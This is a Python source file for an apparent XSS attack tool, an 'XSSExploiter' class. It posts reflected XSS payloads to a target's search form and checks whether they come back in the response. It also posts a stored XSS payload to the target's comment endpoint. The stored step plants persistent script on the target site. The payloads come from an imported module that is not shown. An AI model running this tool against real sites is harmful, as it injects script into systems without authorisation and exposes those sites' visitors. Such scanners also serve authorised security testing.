from typing import List, Optional
import requests
from urllib.parse import urljoin
from utils.payloads import XSS_PAYLOADS
from utils.logger import ExploitLogger

class XSSExploiter:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.logger = ExploitLogger("xss")

    def _test_reflected(self, form_action: str, input_name: str) -> List[str]:
        """Test reflected XSS in search forms."""
        vulnerabilities = []
        for payload in XSS_PAYLOADS["reflected"]:
            try:
                response = self.session.post(
                    urljoin(self.target_url, form_action),
                    data={input_name: payload},
                    timeout=10
                )
                if payload in response.text:
                    vulnerabilities.append(f"Reflected XSS: {payload}")
            except Exception as e:
                self.logger.error(f"Failed to test {payload}: {e}")
        return vulnerabilities

    def _test_stored(self, comment_endpoint: str) -> Optional[str]:
        """Test stored XSS in comment fields."""
        payload = XSS_PAYLOADS["stored"][0]
        try:
            response = self.session.post(
                urljoin(self.target_url, comment_endpoint),
                data={"comment": payload},
                timeout=10
            )
            if response.status_code == 200:
                return f"Stored XSS: {payload}"
        except Exception as e:
            self.logger.error(f"Stored XSS failed: {e}")
        return None

    def run(self) -> dict:
        results = {
            "reflected": self._test_reflected("/search", "query"),
            "stored": self._test_stored("/post_comment")
        }
        return {k: v for k, v in results.items() if v}
